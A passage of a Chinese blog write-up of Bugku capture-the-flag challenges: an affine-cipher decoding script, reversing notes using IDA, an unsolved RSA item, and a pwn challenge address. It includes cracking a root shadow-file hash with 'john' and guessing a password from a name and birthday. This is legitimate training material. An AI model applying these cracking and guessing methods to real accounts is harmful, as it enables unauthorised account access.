+<p>获得<code>flag</code>。</p>
+<h3 id=affine>affine<a hidden class=anchor aria-hidden=true href=#affine>#</a></h3>
+<blockquote>
+<p>Des:y = 17*x-8 flag{szzyfimhyzd}。</p>
+</blockquote>
+<p><code>affine</code>为仿射的意思，那么这就是仿射加密了。</p>
+<p>上脚本。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;szzyfimhyzd&#39;</span>
+list <span style=color:#f92672>=</span> []
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> s:
+    list<span style=color:#f92672>.</span>append(ord(i) <span style=color:#f92672>-</span> <span style=color:#ae81ff>97</span>)
+flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> list:
+    <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>26</span>):
+        c <span style=color:#f92672>=</span> (<span style=color:#ae81ff>17</span> <span style=color:#f92672>*</span> j <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>
+        <span style=color:#66d9ef>if</span> (c <span style=color:#f92672>==</span> i):
+            flag <span style=color:#f92672>+=</span> chr(j <span style=color:#f92672>+</span> <span style=color:#ae81ff>97</span>)
+print(flag)
+</code></pre></div><p>获得<code>flag</code>。</p>
+<h3 id=crack-it>Crack it<a hidden class=anchor aria-hidden=true href=#crack-it>#</a></h3>
+<blockquote>
+<p>Des:破解该文件，获得密码。</p>
+</blockquote>
+<p>给了一个<code>shadow</code>文件，记事本打开看看，内容：</p>
+<pre tabindex=0><code>root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::
+</code></pre><p>这个需要应该是破解用户密码，使用<code>kali</code>的<code>john</code>工具，命令：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>john shadow
+</code></pre></div><p>结果：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311174329274.png alt=image-20210311174329274>
+</p>
+<p>可以发现密码为<code>hellokitty</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=rsa>rsa<a hidden class=anchor aria-hidden=true href=#rsa>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<pre tabindex=0><code>N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597
+
+e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619
+
+enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192
+</code></pre><p>暂时无解。</p>
+<h3 id=来自宇宙的信号>来自宇宙的信号<a hidden class=anchor aria-hidden=true href=#来自宇宙的信号>#</a></h3>
+<blockquote>
+<p>Des:银河战队出击。</p>
+</blockquote>
+<p>搜索标准银河字母，找到对应表。</p>
+<p>对应下来就是：</p>
+<pre tabindex=0><code>nopqrst
+</code></pre><p>获得<code>flag</code>。</p>
+<h2 id=reverse>Reverse<a hidden class=anchor aria-hidden=true href=#reverse>#</a></h2>
+<h3 id=入门逆向>入门逆向<a hidden class=anchor aria-hidden=true href=#入门逆向>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>用<code>IDA</code>打开看看，定位到<code>main</code>函数。</p>
+<p>有很多的<code>mov</code>指令，<code>66h</code>为f，<code>6Ch</code>为l，猜测这一串就是<code>flag</code>，点击对应的值按<code>R</code>进行转换。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=easy_vb>Easy_vb<a hidden class=anchor aria-hidden=true href=#easy_vb>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p><code>IDA</code>打开文件，上下翻一下。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=easy_re>Easy_Re<a hidden class=anchor aria-hidden=true href=#easy_re>#</a></h3>
+<blockquote>
+<p>Des:Hint: 1.逆向常用的工具有IDA 、ollydbg。</p>
+</blockquote>
+<p><code>IDA</code>打开文件，挨个看看。</p>
+<p>搜索<code>CTF</code>。</p>
+<p>双击定位去看看。</p>
+<p>这里的<code>xmmword</code>和<code>dq</code>可以转化成字符串，选中按<code>R</code>进行转换。</p>
+<p>将字符串转换为合理的顺序。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=游戏过关>游戏过关<a hidden class=anchor aria-hidden=true href=#游戏过关>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>先用<code>PEiD</code>看看，</p>
+<h2 id=社工>社工<a hidden class=anchor aria-hidden=true href=#社工>#</a></h2>
+<h3 id=密码>密码<a hidden class=anchor aria-hidden=true href=#密码>#</a></h3>
+<blockquote>
+<p>DES:姓名：张三，生日：19970315。</p>
+</blockquote>
+<p>唔，因为是第一个题，应该不会太难，猜测内容为<code>zs19970315</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h2 id=pwn>Pwn<a hidden class=anchor aria-hidden=true href=#pwn>#</a></h2>
+<h3 id=pwn1>pwn1<a hidden class=anchor aria-hidden=true href=#pwn1>#</a></h3>
+<blockquote>
+<p>Des:nc 114.116.54.89 10001。</p>
+</blockquote>
+<blockquote>
+<p>本文链接：<a href=https://oopsdc.tk/post/bugku/>Bugku | Atmet (oopsdc.tk)</a></p>
+<p>文章许可：本文采用<a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>CC BY-NC-SA 4.0</a>许可协议，转载请注明出处。</p>
+</blockquote>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://examplesite.com/tags/ctf/>CTF</a></li>
+</ul>
+<nav class=paginav>
+<a class=prev href=https://examplesite.com/post/my-1st-post/>
+<span class=title>« Prev Page</span>
+<br>
+<span>My 1st post</span>
+</a>
+<a class=next href=https://examplesite.com/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/>
+<span class=title>Next Page »</span>
+<br>
+<span>攻防世界</span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share Bugku on twitter" href="https://twitter.com/intent/tweet/?text=Bugku&url=https%3a%2f%2fexamplesite.com%2fpost%2fbugku%2f&hashtags=CTF"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Bugku on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fexamplesite.com%2fpost%2fbugku%2f&title=Bugku&summary=Bugku&source=https%3a%2f%2fexamplesite.com%2fpost%2fbugku%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Bugku on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fexamplesite.com%2fpost%2fbugku%2f&title=Bugku"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Bugku on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fexamplesite.com%2fpost%2fbugku%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Bugku on whatsapp" href="https://api.whatsapp.com/send?text=Bugku%20-%20https%3a%2f%2fexamplesite.com%2fpost%2fbugku%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Bugku on telegram" href="https://telegram.me/share/url?text=Bugku&url=https%3a%2f%2fexamplesite.com%2fpost%2fbugku%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2021 <a href=https://examplesite.com/>0opsdc</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
+</body>
+</html>
